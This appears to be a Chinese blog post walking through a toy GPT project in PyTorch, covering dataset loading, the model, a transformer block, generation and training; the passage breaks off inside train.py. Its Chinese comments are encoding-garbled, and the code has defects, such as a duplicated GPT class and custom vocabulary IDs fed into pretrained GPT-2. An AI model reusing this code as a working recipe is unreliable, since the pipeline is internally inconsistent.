è®­ç»ƒä»£ç </span><br><span class="line">|â€”â€”train_model/</span><br><span class="line">|</span><br><span class="line">â”œâ”€â”€ inference.py  # ç”Ÿæˆæ–‡æœ¬</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501292326878.png" alt="1738164364319.png"></p><h2 id="1-dataset-py"><a href="#1-dataset-py" class="headerlink" title="1. dataset.py"></a>1. <strong>dataset.py</strong></h2><p>ç”¨äºå¤„ç†æ•°æ®é›†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#dataset.py</span></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoTokenizer</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TextDataset</span>(torch.utils.data.Dataset):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, directory_path, seq_length, tokenizer</span>):</span><br><span class="line">        <span class="variable language_">self</span>.seq_length = seq_length</span><br><span class="line">        <span class="variable language_">self</span>.tokenizer = tokenizer</span><br><span class="line">        <span class="variable language_">self</span>.data = []</span><br><span class="line">        <span class="variable language_">self</span>.vocab = &#123;&#125;</span><br><span class="line">        <span class="variable language_">self</span>.inverse_vocab = &#123;&#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ç¬¬ä¸€æ­¥ï¼šç»Ÿè®¡æ‰€æœ‰å•è¯çš„é¢‘ç‡</span></span><br><span class="line">        word_counter = Counter()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># éå† directory_path ç›®å½•ä¸­çš„æ‰€æœ‰ .tokenized.txt æ–‡ä»¶</span></span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(directory_path):</span><br><span class="line">            <span class="keyword">if</span> filename.endswith(<span class="string">&quot;.tokenized.txt&quot;</span>):</span><br><span class="line">                file_path = os.path.join(directory_path, filename)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    words = f.read().split()</span><br><span class="line">                    word_counter.update(words)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ç¬¬äºŒæ­¥ï¼šåˆ›å»ºè¯æ±‡è¡¨ï¼Œç»™æ¯ä¸ªå•è¯åˆ†é…ä¸€ä¸ª ID</span></span><br><span class="line">        <span class="variable language_">self</span>.vocab = &#123;word: idx + <span class="number">1</span> <span class="keyword">for</span> idx, (word, _) <span class="keyword">in</span> <span class="built_in">enumerate</span>(word_counter.items())&#125;</span><br><span class="line">        <span class="variable language_">self</span>.vocab[<span class="string">&#x27;&lt;pad&gt;&#x27;</span>] = <span class="number">0</span>  <span class="comment"># ä¸º padding æ·»åŠ ä¸€ä¸ª ID</span></span><br><span class="line">        <span class="variable language_">self</span>.vocab[<span class="string">&#x27;&lt;unk&gt;&#x27;</span>] = <span class="built_in">len</span>(<span class="variable language_">self</span>.vocab)  <span class="comment"># ä¸ºæœªçŸ¥å•è¯æ·»åŠ ä¸€ä¸ª ID</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># åˆ›å»ºé€†è¯æ±‡è¡¨</span></span><br><span class="line">        <span class="variable language_">self</span>.inverse_vocab = &#123;idx: word <span class="keyword">for</span> word, idx <span class="keyword">in</span> <span class="variable language_">self</span>.vocab.items()&#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ç¬¬ä¸‰æ­¥ï¼šå°†æ–‡æœ¬è½¬æ¢ä¸º token ID</span></span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(directory_path):</span><br><span class="line">            <span class="keyword">if</span> filename.endswith(<span class="string">&quot;.tokenized.txt&quot;</span>):</span><br><span class="line">                file_path = os.path.join(directory_path, filename)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    words = f.read().split()</span><br><span class="line">                    <span class="comment"># å°†æ¯ä¸ªå•è¯è½¬æ¢ä¸º token IDï¼Œå¦‚æœä¸åœ¨è¯æ±‡è¡¨ä¸­åˆ™ä½¿ç”¨ &lt;unk&gt;</span></span><br><span class="line">                    token_ids = [<span class="variable language_">self</span>.vocab.get(word, <span class="variable language_">self</span>.vocab[<span class="string">&#x27;&lt;unk&gt;&#x27;</span>]) <span class="keyword">for</span> word <span class="keyword">in</span> words]</span><br><span class="line">                    <span class="variable language_">self</span>.data.append(token_ids)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># å°†æ•°æ®è½¬åŒ–ä¸ºè®­ç»ƒæ‰€éœ€çš„åºåˆ—å½¢å¼</span></span><br><span class="line">        <span class="variable language_">self</span>.data = [<span class="variable language_">self</span>.pad_sequence(seq) <span class="keyword">for</span> seq <span class="keyword">in</span> <span class="variable language_">self</span>.data]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(<span class="variable language_">self</span>.data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, idx</span>):</span><br><span class="line">        input_text = <span class="variable language_">self</span>.data[idx]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ç¼–ç è¾“å…¥æ–‡æœ¬</span></span><br><span class="line">        input_ids = torch.tensor(input_text)  <span class="comment"># è½¬æ¢ä¸º tensor</span></span><br><span class="line">        target_ids = input_ids.clone()  <span class="comment"># ä½¿ç”¨è¾“å…¥ä½œä¸ºç›®æ ‡</span></span><br><span class="line">        <span class="keyword">return</span> input_ids, target_ids</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pad_sequence</span>(<span class="params">self, seq</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;å¡«å……åºåˆ—åˆ° seq_length&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(seq) &lt; <span class="variable language_">self</span>.seq_length:</span><br><span class="line">            <span class="comment"># ä½¿ç”¨ pad token å¡«å……</span></span><br><span class="line">            seq += [<span class="variable language_">self</span>.vocab[<span class="string">&#x27;&lt;pad&gt;&#x27;</span>]] * (<span class="variable language_">self</span>.seq_length - <span class="built_in">len</span>(seq))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># å¦‚æœè¶…å‡º seq_lengthï¼Œåˆ™æˆªæ–­</span></span><br><span class="line">            seq = seq[:<span class="variable language_">self</span>.seq_length]</span><br><span class="line">        <span class="keyword">return</span> seq</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    def __getitem__(self, idx):</span></span><br><span class="line"><span class="string">        input_ids = torch.tensor(self.data[idx], dtype=torch.long)</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        # å¦‚æœè¾“å…¥åºåˆ—é•¿åº¦å°äº seq_lengthï¼Œè¿›è¡Œå¡«å……</span></span><br><span class="line"><span class="string">        padding_length = self.seq_length - input_ids.size(0)</span></span><br><span class="line"><span class="string">        if padding_length &gt; 0:</span></span><br><span class="line"><span class="string">            padding = torch.tensor([self.vocab[&#x27;&lt;pad&gt;&#x27;]] * padding_length, dtype=torch.long)</span></span><br><span class="line"><span class="string">            input_ids = torch.cat([input_ids, padding], dim=0)</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        # è®¾ç½® target_ids ä¸º input_ids çš„ä¸‹ä¸€ä¸ª tokenï¼ˆå³è¯­è¨€æ¨¡å‹çš„è®­ç»ƒç›®æ ‡ï¼‰</span></span><br><span class="line"><span class="string">        target_ids = input_ids[1:].clone()</span></span><br><span class="line"><span class="string">        target_ids = torch.cat([target_ids, torch.tensor([self.vocab[&#x27;&lt;pad&gt;&#x27;]], dtype=torch.long)])</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        return input_ids, target_ids</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="2-gpt-py"><a href="#2-gpt-py" class="headerlink" title="2.gpt.py"></a>2.gpt.py</h2><p>å®ç° GPT æ¨¡å‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gpt.py</span></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"></span><br><span class="line">project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), <span class="string">&#x27;..&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Adding to sys.path:&quot;</span>, project_root)</span><br><span class="line">sys.path.append(project_root)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> model.transformer_block <span class="keyword">import</span> TransformerBlock</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GPT</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, vocab_size, embed_size, num_layers, num_heads, hidden_dim, max_length</span>):</span><br><span class="line">        <span class="built_in">super</span>(GPT, <span class="variable language_">self</span>).__init__()</span><br><span class="line">        <span class="variable language_">self</span>.hidden_dim = hidden_dim  <span class="comment"># æ·»åŠ  hidden_dim å˜é‡</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GPT</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, vocab_size, embed_size, num_heads, num_layers, max_length</span>):</span><br><span class="line">        <span class="built_in">super</span>(GPT, <span class="variable language_">self</span>).__init__()</span><br><span class="line">        <span class="variable language_">self</span>.embedding = nn.Embedding(vocab_size, embed_size)</span><br><span class="line">        <span class="variable language_">self</span>.position_embedding = nn.Embedding(max_length, embed_size)</span><br><span class="line">        <span class="variable language_">self</span>.blocks = nn.ModuleList([</span><br><span class="line">            TransformerBlock(embed_size, num_heads, embed_size * <span class="number">4</span>)</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num_layers)</span><br><span class="line">        ])</span><br><span class="line">        <span class="variable language_">self</span>.fc_out = nn.Linear(embed_size, vocab_size)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        batch_size, seq_length = x.shape</span><br><span class="line">        positions = torch.arange(<span class="number">0</span>, seq_length).expand(batch_size, seq_length)</span><br><span class="line">        x = <span class="variable language_">self</span>.embedding(x) + <span class="variable language_">self</span>.position_embedding(positions)</span><br><span class="line">        <span class="keyword">for</span> block <span class="keyword">in</span> <span class="variable language_">self</span>.blocks:</span><br><span class="line">            x = block(x)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.fc_out(x)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate</span>(<span class="params">self, input_ids, max_length=<span class="number">100</span>, temperature=<span class="number">1.0</span>, top_k=<span class="number">50</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.<span class="built_in">eval</span>()  <span class="comment"># è®¾ç½®ä¸ºè¯„ä¼°æ¨¡å¼</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># è·å–åˆå§‹è¾“å‡º</span></span><br><span class="line">        generated_ids = input_ids</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(max_length):</span><br><span class="line">            outputs = <span class="variable language_">self</span>(generated_ids)</span><br><span class="line">            logits = outputs  <span class="comment"># å‡è®¾æ¨¡å‹çš„è¾“å‡ºæ˜¯ logits</span></span><br><span class="line">            logits = logits[:, -<span class="number">1</span>, :]  <span class="comment"># åªå…³æ³¨æœ€æ–°ç”Ÿæˆçš„ token</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># åº”ç”¨æ¸©åº¦é‡‡æ ·</span></span><br><span class="line">            logits = logits / temperature</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Top-K é‡‡æ ·</span></span><br><span class="line">            <span class="keyword">if</span> top_k &gt; <span class="number">0</span>:</span><br><span class="line">                top_k_values, top_k_indices = torch.topk(logits, top_k)</span><br><span class="line">                top_k_probs = F.softmax(top_k_values, dim=-<span class="number">1</span>)</span><br><span class="line">                next_token = torch.multinomial(top_k_probs, <span class="number">1</span>)</span><br><span class="line">                next_token = top_k_indices.gather(-<span class="number">1</span>, next_token)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># é»˜è®¤é‡‡æ ·</span></span><br><span class="line">                probs = F.softmax(logits, dim=-<span class="number">1</span>)</span><br><span class="line">                next_token = torch.multinomial(probs, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># æ·»åŠ ç”Ÿæˆçš„ token åˆ°è¾“å…¥åºåˆ—</span></span><br><span class="line">            generated_ids = torch.cat([generated_ids, next_token], dim=-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> generated_ids</span><br><span class="line">    </span><br></pre></td></tr></table></figure><h2 id="3-transformer-block-py"><a href="#3-transformer-block-py" class="headerlink" title="3.transformer_block.py"></a>3.transformer_block.py</h2><p>ç”¨äºå®ç° GPT æ¨¡å‹çš„ä¸€ä¸ªåŸºæœ¬ç»„ä»¶â€”â€”Transformer å—ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># transformer_block.py</span></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AttentionHead</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, embed_size, head_size</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.q = nn.Linear(embed_size, head_size, bias=<span class="literal">False</span>)</span><br><span class="line">        <span class="variable language_">self</span>.k = nn.Linear(embed_size, head_size, bias=<span class="literal">False</span>)</span><br><span class="line">        <span class="variable language_">self</span>.v = nn.Linear(embed_size, head_size, bias=<span class="literal">False</span>)</span><br><span class="line">        <span class="variable language_">self</span>.scale = head_size ** -<span class="number">0.5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        q = <span class="variable language_">self</span>.q(x)</span><br><span class="line">        k = <span class="variable language_">self</span>.k(x)</span><br><span class="line">        v = <span class="variable language_">self</span>.v(x)</span><br><span class="line">        scores = torch.matmul(q, k.transpose(-<span class="number">2</span>, -<span class="number">1</span>)) * <span class="variable language_">self</span>.scale</span><br><span class="line">        attention = torch.softmax(scores, dim=-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> torch.matmul(attention, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TransformerBlock</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, embed_size, num_heads, feed_forward_size</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.attention = nn.MultiheadAttention(embed_dim=embed_size, num_heads=num_heads)</span><br><span class="line">        <span class="variable language_">self</span>.ff = nn.Sequential(</span><br><span class="line">            nn.Linear(embed_size, feed_forward_size),</span><br><span class="line">            nn.ReLU(),</span><br><span class="line">            nn.Linear(feed_forward_size, embed_size),</span><br><span class="line">        )</span><br><span class="line">        <span class="variable language_">self</span>.norm1 = nn.LayerNorm(embed_size)</span><br><span class="line">        <span class="variable language_">self</span>.norm2 = nn.LayerNorm(embed_size)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        attention_out, _ = <span class="variable language_">self</span>.attention(x, x, x)</span><br><span class="line">        x = <span class="variable language_">self</span>.norm1(x + attention_out)</span><br><span class="line">        ff_out = <span class="variable language_">self</span>.ff(x)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.norm2(x + ff_out)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="4-generate-py"><a href="#4-generate-py" class="headerlink" title="4. generate.py"></a>4. <strong>generate.py</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> model.gpt <span class="keyword">import</span> GPT</span><br><span class="line"><span class="keyword">from</span> data.tokenizer <span class="keyword">import</span> SimpleTokenizer</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_text</span>(<span class="params">prompt, model, tokenizer, max_length=<span class="number">50</span></span>):</span><br><span class="line">    tokens = tokenizer.encode(prompt)</span><br><span class="line">    input_data = torch.tensor([tokens])</span><br><span class="line"></span><br><span class="line">    model.<span class="built_in">eval</span>()</span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(max_length):</span><br><span class="line">            output = model(input_data)</span><br><span class="line">            next_token = torch.argmax(output[:, -<span class="number">1</span>, :], dim=-<span class="number">1</span>)</span><br><span class="line">            input_data = torch.cat([input_data, next_token.unsqueeze(<span class="number">0</span>)], dim=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> next_token.item() == tokenizer.word_to_idx[<span class="string">&quot;&lt;END&gt;&quot;</span>]:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tokenizer.decode(input_data[<span class="number">0</span>].tolist())</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    vocab_size = <span class="number">10000</span></span><br><span class="line">    embed_size = <span class="number">128</span></span><br><span class="line">    num_heads = <span class="number">8</span></span><br><span class="line">    num_layers = <span class="number">4</span></span><br><span class="line">    max_length = <span class="number">100</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Load pretrained model</span></span><br><span class="line">    model = GPT(vocab_size, embed_size, num_heads, num_layers, max_length)</span><br><span class="line">    tokenizer = SimpleTokenizer(vocab_size)</span><br><span class="line">    tokenizer.build_vocab(<span class="string">&quot;This is a small test corpus &lt;END&gt;&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    prompt = <span class="string">&quot;This is a&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(generate_text(prompt, model, tokenizer))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="5-train-py"><a href="#5-train-py" class="headerlink" title="5.train.py"></a>5.<strong>train.py</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># train/train.py</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), <span class="string">&#x27;..&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Adding to sys.path:&quot;</span>, project_root)</span><br><span class="line">sys.path.append(project_root)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> DataLoader</span><br><span class="line"><span class="keyword">from</span> data.dataset <span class="keyword">import</span> TextDataset</span><br><span class="line"><span class="keyword">from</span> model.gpt <span class="keyword">import</span> GPT</span><br><span class="line"><span class="keyword">from</span> torch.optim <span class="keyword">import</span> AdamW</span><br><span class="line"><span class="keyword">from</span> torch.optim.lr_scheduler <span class="keyword">import</span> StepLR</span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoTokenizer</span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> GPT2LMHeadModel</span><br><span class="line"></span><br><span class="line"><span class="comment"># åœ¨å¤–éƒ¨åŠ è½½æ¨¡å‹å’Œåˆ†è¯å™¨</span></span><br><span class="line">model = GPT2LMHeadModel.from_pretrained(<span class="string">&#x27;gpt2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">train</span>():</span><br><span class="line">    <span class="comment"># åŠ è½½åˆ†è¯å™¨</span></span><br><span class="line">    tokenizer = AutoTokenizer.from_pretrained(<span class="string">&#x27;gpt2&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># è®¾ç½®è®¾å¤‡</span></span><br><span class="line">    device = torch.device(<span class="string">&quot;cuda&quot;</span> <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> <span class="string">&quot;cpu&quot;</span>)</span><br><span class="line">    model.to(device)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># é…ç½®æ•°æ®é›†</span></span><br><span class="line">    dataset = TextDataset(directory_path=<span class="string">&quot;data/tokenized&quot;</span>, seq_length=<span class="number">128</span>, tokenizer=tokenizer)</span><br><span class="line">    data_loader = DataLoader(dataset, batch_size=<span class="number">4</span>, shuffle=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># é…ç½®ä¼˜åŒ–å™¨</span></span><br><span class="line">    optimizer = AdamW(model.parameters(), lr=<span class="number">1e-5</span>)</span><br><span class="line">    scheduler = StepLR(optimizer, step_size=<span class="number">5</span>, gamma=<span class="number">0.5</span>)  <span class="comment"># æ¯5ä¸ªepochå‡å°‘å­¦ä¹ ç‡</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># è®­ç»ƒæ¨¡å‹</span></span><br><span class="line">    model.train()</span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):  <span class="comment"># å‡è®¾è®­ç»ƒ3ä¸ªepoch</span></span><br><span class="line">        total_loss = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> batch_idx, (input_ids, target_ids) <span class="keyword">in</span> <span class="built_in">enumerate</span>(data_loader):</span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line"></span><br><span class="line">            input_ids = input_ids.to(device)</span><br><span class="line">            target_ids = 